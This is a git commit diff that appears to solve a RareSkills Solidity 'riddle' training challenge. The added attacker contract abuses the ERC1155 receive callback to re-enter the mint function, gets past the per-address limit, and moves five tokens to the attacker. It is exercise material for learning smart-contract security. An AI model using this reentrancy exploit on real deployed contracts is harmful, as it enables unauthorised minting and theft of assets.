471758c48a10cebdc190a193f20937755ad28f81
ElvinsJ <caoyifeng007@163.com>
2023-08-29 11:21:28 +0100

    Week5 RareSkills Riddles ERC1155 complete

--- common/solidity-riddles/contracts/Overmint1-ERC1155.sol
+++ common/solidity-riddles/contracts/Overmint1-ERC1155.sol
@@ -3,6 +3,7 @@ pragma solidity 0.8.15;
 import "@openzeppelin/contracts/utils/Address.sol";
 import "@openzeppelin/contracts/token/ERC1155/ERC1155.sol";
 import "@openzeppelin/contracts/token/ERC1155/utils/ERC1155Holder.sol";
+import "@openzeppelin/contracts/token/ERC1155/utils/ERC1155Receiver.sol";
 
 contract Overmint1_ERC1155 is ERC1155 {
     using Address for address;
@@ -20,5 +21,52 @@ contract Overmint1_ERC1155 is ERC1155 {
 
     function success(address _attacker, uint256 id) external view returns (bool) {
         return balanceOf(_attacker, id) == 5;
+    }
+}
+
+contract Overmint1_ERC1155_Attacker is ERC1155Receiver {
+    Overmint1_ERC1155 public victim;
+    address public attacker;
+
+    constructor(address addr) {
+        victim = Overmint1_ERC1155(addr);
+        attacker = msg.sender;
+    }
+
+    function onERC1155Received(address, address, uint256, uint256, bytes calldata) external returns (bytes4) {
+        if (victim.balanceOf(address(this), 0) < 5) {
+            victim.mint(0, "");
+        }
+        return IERC1155Receiver.onERC1155Received.selector;
+    }
+
+    function onERC1155BatchReceived(
+        address,
+        address,
+        uint256[] calldata,
+        uint256[] calldata,
+        bytes calldata
+    ) external returns (bytes4) {
+        return IERC1155Receiver.onERC1155BatchReceived.selector;
+    }
+
+    function attack() external {
+        victim.mint(0, "");
+
+        uint256[] memory ids = new uint256[](5);
+        ids[0] = 0;
+        ids[1] = 0;
+        ids[2] = 0;
+        ids[3] = 0;
+        ids[4] = 0;
+
+        uint256[] memory amounts = new uint256[](5);
+        amounts[0] = 1;
+        amounts[1] = 1;
+        amounts[2] = 1;
+        amounts[3] = 1;
+        amounts[4] = 1;
+
+        victim.safeBatchTransferFrom(address(this), attacker, ids, amounts, "");
     }
 }
